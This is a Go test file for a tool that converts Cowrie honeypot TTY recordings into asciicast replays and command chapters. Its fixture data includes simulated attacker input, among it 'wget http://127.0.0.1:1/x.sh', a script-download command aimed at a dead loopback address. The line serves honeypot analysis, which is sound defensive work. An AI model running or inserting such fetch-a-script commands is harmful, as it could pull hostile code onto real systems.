package ttylog

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"errors"
	"io"
	"math"
	"os"
	"slices"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/devleesch001/cauri/internal/asciicast"
)

// testdata/cowrie-v3.1.2.tty was written by the official cowrie/cowrie
// image (v3.1.2) during a scripted session: login, three commands, exit.
// It is the recording of session 6f07bbfeafaa, whose events are in
// ../ingest/testdata/cowrie-v3.1.2.json.
const realFile = "testdata/cowrie-v3.1.2.tty"

var t0 = time.Date(2026, 10, 14, 9, 0, 0, 0, time.UTC)

// rec encodes one record at t0 + offset.
func rec(op, dir int32, offset time.Duration, data string) []byte {
	at := t0.Add(offset)
	b := make([]byte, headerSize, headerSize+len(data))
	le := binary.LittleEndian
	le.PutUint32(b[0:], uint32(op))
	le.PutUint32(b[8:], uint32(len(data)))
	le.PutUint32(b[12:], uint32(dir))
	le.PutUint32(b[16:], uint32(at.Unix()))
	le.PutUint32(b[20:], uint32(at.Nanosecond()/1000))
	return append(b, data...)
}

func file(records ...[]byte) []byte { return bytes.Join(records, nil) }

type event struct {
	at   time.Duration // absolute, recomputed from the intervals
	code string
	data string
}

// convert runs Convert and decodes its v3 output.
func convert(t *testing.T, data []byte, opts Options) (map[string]any, []event, error) {
	t.Helper()
	var out bytes.Buffer
	err := Convert(bytes.NewReader(data), asciicast.NewV3(&out), opts)
	if out.Len() == 0 {
		return nil, nil, err
	}
	lines := strings.Split(strings.TrimSuffix(out.String(), "\n"), "\n")
	var header map[string]any
	if jerr := json.Unmarshal([]byte(lines[0]), &header); jerr != nil {
		t.Fatalf("header %s: %v", lines[0], jerr)
	}
	var events []event
	var at float64
	for _, l := range lines[1:] {
		var e [3]any
		if jerr := json.Unmarshal([]byte(l), &e); jerr != nil {
			t.Fatalf("event %s: %v", l, jerr)
		}
		at += e[0].(float64)
		events = append(events, event{
			at:   time.Duration(math.Round(at*1e6)) * time.Microsecond,
			code: e[1].(string), data: e[2].(string),
		})
	}
	return header, events, err
}

func TestReaderRealRecording(t *testing.T) {
	f, err := os.Open(realFile)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = f.Close() }()
	r := NewReader(f)
	ops := map[int32]int{}
	dirs := map[int32]int{}
	var input []string
	for {
		rec, err := r.Next()
		if errors.Is(err, io.EOF) {
			break
		}
		if err != nil {
			t.Fatal(err)
		}
		ops[rec.Op]++
		if rec.Op == OpWrite {
			dirs[rec.Dir]++
			if rec.Dir == DirInput {
				input = append(input, string(rec.Data))
			}
		}
	}
	if ops[OpOpen] != 1 || ops[OpWrite] != 93 || ops[OpClose] != 1 || dirs[DirOutput] != 89 || dirs[DirInput] != 4 {
		t.Errorf("ops %v, dirs %v", ops, dirs)
	}
	if got := strings.Join(input, ""); got != "uname -a\ncat /proc/cpuinfo | head -3\nwget http://127.0.0.1:1/x.sh\nexit\n" {
		t.Errorf("input = %q", got)
	}
}

func TestReaderErrors(t *testing.T) {
	good := rec(OpWrite, DirOutput, 0, "ok")
	negative := rec(OpWrite, DirOutput, 0, "")
	binary.LittleEndian.PutUint32(negative[8:], 0xffffffff)
	huge := rec(OpWrite, DirOutput, 0, "")
	binary.LittleEndian.PutUint32(huge[8:], MaxData+1)
	badUsec := rec(OpOpen, 0, 0, "")
	binary.LittleEndian.PutUint32(badUsec[20:], 1e6)

	for name, c := range map[string]struct {
		data []byte
		want error
	}{
		"truncated header": {good[:10], ErrTruncated},
		"truncated data":   {good[:len(good)-1], ErrTruncated},
		"negative length":  {negative, ErrCorrupt},
		"length too large": {huge, ErrCorrupt},
		"microseconds":     {badUsec, ErrCorrupt},
	} {
		_, err := NewReader(bytes.NewReader(c.data)).Next()
		if !errors.Is(err, c.want) {
			t.Errorf("%s: err = %v, want %v", name, err, c.want)
		}
	}
}

func TestConvertRealRecording(t *testing.T) {
	data, err := os.ReadFile(realFile)
	if err != nil {
		t.Fatal(err)
	}
	header, events, err := convert(t, data, Options{IdleTimeLimit: 2 * time.Second})
	if err != nil {
		t.Fatal(err)
	}
	term := header["term"].(map[string]any)
	if header["version"] != 3.0 || term["cols"] != 80.0 || term["rows"] != 24.0 || header["idle_time_limit"] != 2.0 {
		t.Errorf("header = %v", header)
	}
	counts := map[string]int{}
	var input, output strings.Builder
	for _, e := range events {
		counts[e.code]++
		if e.code == asciicast.Input {
			input.WriteString(e.data)
		} else {
			output.WriteString(e.data)
		}
	}
	if counts[asciicast.Input] != 4 || counts[asciicast.Output] != 89 {
		t.Errorf("events = %v", counts)
	}
	if !strings.Contains(input.String(), "wget http://127.0.0.1:1/x.sh") || !strings.Contains(output.String(), "Debian GNU/Linux") {
		t.Errorf("content lost: input %q", input.String())
	}
	// Real timing: the last write is 0.913 s after the start.
	if last := events[len(events)-1].at; last < 900*time.Millisecond || last > 920*time.Millisecond {
		t.Errorf("last event at %v", last)
	}
}

func TestConvertTiming(t *testing.T) {
	data := file(
		rec(OpOpen, 0, 0, ""),
		rec(OpWrite, DirOutput, 10*time.Microsecond, "$ "),
		rec(OpWrite, DirInput, 61*time.Second, "x"), // a long pause, kept
		rec(OpWrite, DirOutput, 61*time.Second+3*time.Microsecond, "x"),
		rec(OpClose, 0, 62*time.Second, ""),
	)
	header, events, err := convert(t, data, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := header["idle_time_limit"]; ok {
		t.Error("idle_time_limit written without being asked")
	}
	if header["timestamp"] != float64(t0.Unix()) {
		t.Errorf("timestamp = %v", header["timestamp"])
	}
	want := []event{
		{10 * time.Microsecond, "o", "$ "},
		{61 * time.Second, "i", "x"},
		{61*time.Second + 3*time.Microsecond, "o", "x"},
	}
	if len(events) != len(want) {
		t.Fatalf("events = %v", events)
	}
	for i := range want {
		if events[i] != want[i] {
			t.Errorf("event %d = %v, want %v", i, events[i], want[i])
		}
	}
}

func TestConvertUTF8(t *testing.T) {
	data := file(
		rec(OpOpen, 0, 0, ""),
		rec(OpWrite, DirOutput, time.Millisecond, "a\xc3"),        // é cut in two
		rec(OpWrite, DirOutput, 2*time.Millisecond, "\xa9b\xff"),  // its end, then an invalid byte
		rec(OpWrite, DirOutput, 3*time.Millisecond, "\xe2\x82"),   // € never completed
		rec(OpWrite, DirInput, 3*time.Millisecond, "p\xc3\xa0ss"), // input decoded on its own
	)
	_, events, err := convert(t, data, Options{})
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, e := range events {
		got = append(got, e.code+":"+e.data)
	}
	want := []string{"o:a", "o:éb\uFFFD", "i:pàss", "o:\uFFFD"}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Errorf("events = %q, want %q", got, want)
	}
}

func TestConvertSizes(t *testing.T) {
	data := file(
		rec(OpOpen, 0, 0, ""),
		rec(OpWrite, DirOutput, time.Second, "a"),
		rec(OpWrite, DirOutput, 3*time.Second, "b"),
	)
	cases := map[string]struct {
		sizes      []TermSize
		header     string
		resizes    []string
		resizeTime time.Duration
	}{
		"none": {nil, "80x24", nil, 0},
		"before the start": {[]TermSize{
			{t0.Add(-time.Second), 100, 30},
			{t0.Add(-time.Millisecond), 120, 40},
		}, "120x40", nil, 0},
		"just after the start": {[]TermSize{{t0.Add(5 * time.Millisecond), 132, 43}}, "132x43", nil, 0},
		"resized during the session": {[]TermSize{
			{t0, 100, 30},
			{t0.Add(2 * time.Second), 150, 50},
			{t0.Add(time.Hour), 10, 10}, // after the end: dropped
		}, "100x30", []string{"150x50"}, 2 * time.Second},
		"implausible": {[]TermSize{{t0, 0, 24}, {t0, 100000, 24}}, "80x24", nil, 0},
	}
	for name, c := range cases {
		header, events, err := convert(t, data, Options{Sizes: c.sizes})
		if err != nil {
			t.Fatal(err)
		}
		term := header["term"].(map[string]any)
		if got := asciicast.ResizeData(int(term["cols"].(float64)), int(term["rows"].(float64))); got != c.header {
			t.Errorf("%s: header size %s, want %s", name, got, c.header)
		}
		var resizes []string
		for _, e := range events {
			if e.code == asciicast.Resize {
				resizes = append(resizes, e.data)
				if e.at != c.resizeTime {
					t.Errorf("%s: resize at %v, want %v", name, e.at, c.resizeTime)
				}
			}
		}
		if strings.Join(resizes, ",") != strings.Join(c.resizes, ",") {
			t.Errorf("%s: resizes %v, want %v", name, resizes, c.resizes)
		}
	}
}

// A damaged recording is replayed up to the damage.
func TestConvertDamaged(t *testing.T) {
	data := file(
		rec(OpOpen, 0, 0, ""),
		rec(OpWrite, DirOutput, time.Second, "kept"),
		rec(OpWrite, DirOutput, 2*time.Second, "lost")[:headerSize+2],
	)
	_, events, err := convert(t, data, Options{})
	if !errors.Is(err, ErrTruncated) {
		t.Errorf("err = %v, want ErrTruncated", err)
	}
	if len(events) != 1 || events[0].data != "kept" {
		t.Errorf("events = %v", events)
	}

	header, _, err := convert(t, nil, Options{})
	if err == nil || header != nil {
		t.Errorf("empty file: header %v, err %v", header, err)
	}
}

// The file comes from the honeypot: any content must give either valid
// asciicast or an error, never a panic or an invalid line.
func FuzzConvert(f *testing.F) {
	real, err := os.ReadFile(realFile)
	if err != nil {
		f.Fatal(err)
	}
	f.Add(real)
	f.Add(real[:100])
	f.Add(file(rec(OpOpen, 0, 0, ""), rec(OpWrite, DirOutput, time.Second, "\xff\xc3")))
	f.Fuzz(func(t *testing.T, data []byte) {
		var out bytes.Buffer
		_ = Convert(bytes.NewReader(data), asciicast.NewV3(&out), Options{})
		for _, line := range strings.Split(strings.TrimSuffix(out.String(), "\n"), "\n") {
			if out.Len() > 0 && !json.Valid([]byte(line)) {
				t.Fatalf("invalid line %q", line)
			}
		}
	})
}

// Line ends of the output get the carriage return a real terminal adds;
// input is left as typed.
func TestConvertLineEnds(t *testing.T) {
	data := file(
		rec(OpOpen, 0, 0, ""),
		rec(OpWrite, DirOutput, time.Millisecond, "one\ntwo\r\n"),
		rec(OpWrite, DirInput, 2*time.Millisecond, "ls\n"),
	)
	_, events, err := convert(t, data, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if events[0].data != "one\r\ntwo\r\r\n" || events[1].data != "ls\n" {
		t.Errorf("events = %+v", events)
	}
}

// commandsOf reads the cowrie.command.input events of a session from the
// cowrie.json test capture.
func commandsOf(t testing.TB, session string) []Command {
	t.Helper()
	data, err := os.ReadFile("../ingest/testdata/cowrie-v3.1.2.json")
	if err != nil {
		t.Fatal(err)
	}
	var cmds []Command
	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		var e struct{ Eventid, Session, Input, Timestamp string }
		if err := json.Unmarshal([]byte(line), &e); err != nil {
			t.Fatal(err)
		}
		if e.Session == session && e.Eventid == "cowrie.command.input" {
			ts, err := time.Parse(time.RFC3339Nano, e.Timestamp)
			if err != nil {
				t.Fatal(err)
			}
			cmds = append(cmds, Command{Time: ts, Input: e.Input})
		}
	}
	return cmds
}

func TestChaptersRealRecording(t *testing.T) {
	f, err := os.Open(realFile)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = f.Close() }()
	sum, err := Chapters(f, commandsOf(t, "6f07bbfeafaa"))
	if err != nil {
		t.Fatal(err)
	}
	if sum.Records != 95 || len(sum.Chapters) != 4 {
		t.Fatalf("records %d, chapters %v", sum.Records, sum.Chapters)
	}
	want := []struct{ command, output string }{
		{"uname -a", "Linux svr04 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 GNU/Linux"},
		{"cat /proc/cpuinfo | head -3", "processor\t: 0\nvendor_id\t: GenuineIntel\ncpu family\t: 6"},
		{"wget http://127.0.0.1:1/x.sh", "--2026-10-14 08:26:27--  http://127.0.0.1:1/x.sh\nResolving 127.0.0.1 (127.0.0.1)... failed: Temporary failure in name resolution.\nwget: unable to resolve host address ‘127.0.0.1’"},
		{"exit", ""},
	}
	for i, w := range want {
		c := sum.Chapters[i]
		if c.Command != w.command || c.Output != w.output || c.Truncated || c.FullScreen {
			t.Errorf("chapter %d = %s", i, c)
		}
	}
	if d := sum.Chapters[1].Time; d < 300*time.Millisecond || d > 310*time.Millisecond {
		t.Errorf("second chapter at %v", d)
	}
}

// keys types s one key at a time, each followed by its echo, like an
// interactive SSH client; Enter is "\r", echoed as "\n".
func keys(at time.Duration, s string) [][]byte {
	var out [][]byte
	for _, k := range s {
		echo := string(k)
		if k == '\r' {
			echo = "\n"
		}
		out = append(out, rec(OpWrite, DirInput, at, string(k)), rec(OpWrite, DirOutput, at, echo))
		at += 10 * time.Millisecond
	}
	return out
}

func TestChaptersInteractive(t *testing.T) {
	prompt := "\x1b[1;32mroot@svr04\x1b[0m:~# "
	var parts [][]byte
	parts = append(parts, rec(OpOpen, 0, 0, ""), rec(OpWrite, DirOutput, 0, prompt))
	// "lss", backspace, Enter: the command line is edited.
	parts = append(parts, keys(time.Second, "lss\x7f\r")...)
	parts = append(parts,
		rec(OpWrite, DirOutput, 1100*time.Millisecond, "\x1b[34mbin\x1b[0m  etc\n"),
		rec(OpWrite, DirOutput, 1100*time.Millisecond, prompt),
	)
	parts = append(parts, keys(2*time.Second, "wget x\r")...)
	parts = append(parts,
		rec(OpWrite, DirOutput, 2100*time.Millisecond, " 10%\r 50%\r100%\n"),
		rec(OpWrite, DirOutput, 2100*time.Millisecond, "saved\n"+prompt),
	)
	parts = append(parts, keys(3*time.Second, "vim\r")...)
	parts = append(parts,
		rec(OpWrite, DirOutput, 3100*time.Millisecond, "\x1b[?1049h\x1b[H~\n~\n\x1b[?1049l"),
		rec(OpWrite, DirOutput, 3100*time.Millisecond, prompt),
	)
	parts = append(parts, keys(4*time.Second, "yes\r")...)
	parts = append(parts, rec(OpWrite, DirOutput, 4100*time.Millisecond, strings.Repeat("y\n", MaxChapterOutput)))

	// Cowrie logs each command a fraction of a millisecond after its Enter.
	enter := func(at time.Duration, line string) Command {
		return Command{Time: t0.Add(at + time.Duration(len(line)-1)*10*time.Millisecond + 300*time.Microsecond), Input: line}
	}
	cmds := []Command{
		enter(time.Second, "lss\x7f"), enter(2*time.Second, "wget x"),
		enter(3*time.Second, "vim"), enter(4*time.Second, "yes"),
	}
	cmds[0].Input = "ls"

	sum, err := Chapters(bytes.NewReader(file(parts...)), cmds)
	if err != nil {
		t.Fatal(err)
	}
	got := sum.Chapters
	if len(got) != 4 {
		t.Fatalf("chapters = %v", got)
	}
	if got[0].Command != "ls" || got[0].Output != "bin  etc" {
		t.Errorf("colours and prompt: %s", got[0])
	}
	if got[1].Output != "100%\nsaved" {
		t.Errorf("carriage returns: %s", got[1])
	}
	if !got[2].FullScreen || got[2].Output != "" {
		t.Errorf("full screen: %s", got[2])
	}
	if !got[3].Truncated || len(got[3].Output) > MaxChapterOutput || !strings.HasPrefix(got[3].Output, "y\ny\n") {
		t.Errorf("truncation: truncated %v, %d bytes", got[3].Truncated, len(got[3].Output))
	}
}

func TestPlainText(t *testing.T) {
	for raw, want := range map[string]string{
		"a\x1b[31mred\x1b[0mb": "aredb",
		"abc\bd":               "abd",
		"one\r\ntwo":           "one\ntwo",
		"50%\r100%":            "100%",
		"x\x1b]0;title\x07y":   "xy",
		"x\x1b]0;title\x1b\\y": "xy",
		"x\x1b(By":             "xy",
		"tab\there\x00\x07":    "tab\there",
		"bad \xff byte":        "bad � byte",
		"unterminated \x1b[":   "unterminated ",
	} {
		if got, _ := plainText([]byte(raw)); got != want {
			t.Errorf("plainText(%q) = %q, want %q", raw, got, want)
		}
	}
	if _, full := plainText([]byte("\x1b[?1049h")); !full {
		t.Error("alternate screen not detected")
	}
}

func TestChaptersErrors(t *testing.T) {
	if _, err := Chapters(bytes.NewReader(nil), nil); !errors.Is(err, ErrTruncated) {
		t.Errorf("empty recording: %v", err)
	}
	// A damaged recording still gives the chapters before the damage.
	data := file(
		rec(OpOpen, 0, 0, ""),
		rec(OpWrite, DirInput, time.Second, "id\r"),
		rec(OpWrite, DirOutput, time.Second, "id\nuid=0(root)\n# "),
		rec(OpWrite, DirOutput, 2*time.Second, "lost")[:headerSize+1],
	)
	sum, err := Chapters(bytes.NewReader(data), []Command{{Time: t0.Add(time.Second), Input: "id"}})
	if err != nil || len(sum.Chapters) != 1 || sum.Chapters[0].Output != "uid=0(root)" {
		t.Errorf("damaged: %v, %v", sum, err)
	}
}

func TestConvertMarkers(t *testing.T) {
	data := file(
		rec(OpOpen, 0, 0, ""),
		rec(OpWrite, DirOutput, time.Second, "a"),
		rec(OpWrite, DirOutput, 3*time.Second, "b"),
	)
	long := strings.Repeat("x", maxMarkerLabel+10)
	_, events, err := convert(t, data, Options{Commands: []Command{
		{Time: t0.Add(2 * time.Second), Input: "ls -la"},
		{Time: t0.Add(5 * time.Second), Input: long}, // after the last record
	}})
	if err != nil {
		t.Fatal(err)
	}
	var markers []event
	for _, e := range events {
		if e.code == asciicast.Marker {
			markers = append(markers, e)
		}
	}
	if len(markers) != 2 || markers[0].at != 2*time.Second || markers[0].data != "ls -la" {
		t.Fatalf("markers = %v", markers)
	}
	if markers[1].at != 5*time.Second || len([]rune(markers[1].data)) != maxMarkerLabel+1 {
		t.Errorf("late, long marker = %v", markers[1])
	}
	if events[len(events)-1].code != asciicast.Marker {
		t.Error("the marker after the end must come last")
	}
}

func FuzzChapters(f *testing.F) {
	real, err := os.ReadFile(realFile)
	if err != nil {
		f.Fatal(err)
	}
	cmds := commandsOf(f, "6f07bbfeafaa")
	f.Add(real)
	f.Add(file(rec(OpOpen, 0, 0, ""), rec(OpWrite, DirOutput, time.Second, "\x1b[?1049h\x1b]0;\x1b[")))
	f.Fuzz(func(t *testing.T, data []byte) {
		sum, _ := Chapters(bytes.NewReader(data), cmds)
		for _, c := range sum.Chapters {
			if len(c.Output) > 4*MaxChapterOutput || !utf8.ValidString(c.Output) {
				t.Fatalf("bad chapter %s", c)
			}
		}
	})
}

// Commands and Enter keys come from the attacker: matching them must stay
// linear, not compare every command with every key.
func TestChaptersManyCommands(t *testing.T) {
	const n = 200_000
	var buf bytes.Buffer
	buf.Write(rec(OpOpen, 0, 0, ""))
	cmds := make([]Command, n)
	for i := range n {
		at := time.Duration(i) * time.Millisecond
		buf.Write(rec(OpWrite, DirInput, at, "\r"))
		cmds[i] = Command{Time: t0.Add(at), Input: "x"}
	}
	start := time.Now()
	sum, err := Chapters(bytes.NewReader(buf.Bytes()), cmds)
	if err != nil || len(sum.Chapters) != n {
		t.Fatalf("%d chapters, %v", len(sum.Chapters), err)
	}
	if d := time.Since(start); d > 5*time.Second {
		t.Errorf("took %v: not linear", d)
	}
}

// The output kept for all chapters together is bounded too.
func TestChaptersTotalOutput(t *testing.T) {
	const n = 3 * MaxTotalOutput / MaxChapterOutput // three times the budget
	var parts [][]byte
	parts = append(parts, rec(OpOpen, 0, 0, ""))
	cmds := make([]Command, n)
	big := strings.Repeat("z", MaxChapterOutput-10) + "\n"
	for i := range n {
		at := time.Duration(i) * time.Second
		parts = append(parts,
			rec(OpWrite, DirInput, at, "\r"),
			rec(OpWrite, DirOutput, at, "\n"+big+"# "),
		)
		cmds[i] = Command{Time: t0.Add(at), Input: "cat"}
	}
	sum, err := Chapters(bytes.NewReader(file(parts...)), cmds)
	if err != nil {
		t.Fatal(err)
	}
	total, truncated := 0, 0
	for _, c := range sum.Chapters {
		total += len(c.Output)
		if c.Truncated {
			truncated++
		}
	}
	if total > MaxTotalOutput || truncated < n/2 {
		t.Errorf("total output %d bytes, %d of %d chapters truncated", total, truncated, n)
	}
}

// An exec channel has no shell: its command, recorded whole, is shown
// with a faint prompt before its output, as if typed.
func TestConvertExecCommand(t *testing.T) {
	data := file(
		rec(OpOpen, 0, 0, ""),
		rec(OpWrite, DirInteract, time.Millisecond, "uname -a\n"),
		rec(OpWrite, DirOutput, 2*time.Millisecond, "Linux svr04\n"),
	)
	_, events, err := convert(t, data, Options{Prompt: "root@hp-01:~# "})
	if err != nil {
		t.Fatal(err)
	}
	want := []event{
		{time.Millisecond, "o", "\x1b[2mroot@hp-01:~# \x1b[22muname -a\r\n"},
		{2 * time.Millisecond, "o", "Linux svr04\r\n"},
	}
	if !slices.Equal(events, want) {
		t.Errorf("events = %+v", events)
	}
	// Without a prompt, the command alone.
	if _, events, _ = convert(t, data, Options{}); len(events) == 0 || events[0].data != "uname -a\r\n" {
		t.Errorf("without prompt: %+v", events)
	}
}
